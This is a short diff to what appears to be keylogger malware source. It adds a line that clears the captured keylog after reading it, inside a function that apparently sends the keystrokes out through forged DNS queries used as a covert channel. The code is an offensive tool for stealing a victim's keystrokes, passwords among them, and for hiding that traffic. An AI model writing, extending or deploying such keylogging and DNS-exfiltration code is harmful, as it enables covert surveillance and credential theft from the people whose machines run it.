@@ -302,6 +302,7 @@ def start_keylogger():
 
 def transfer_keylogger():
     data = KEYLOGGER_INSTANCE.get_keylog()
+    KEYLOGGER_INSTANCE.clear_keylog()
     if not data:
         print("FAILED: Keylogger has not captured any data.")
         query = forge_dns_query_stream("FAILED: Keylogger has not captured any data.", GENERAL_MSG_IDENTIFICATION)
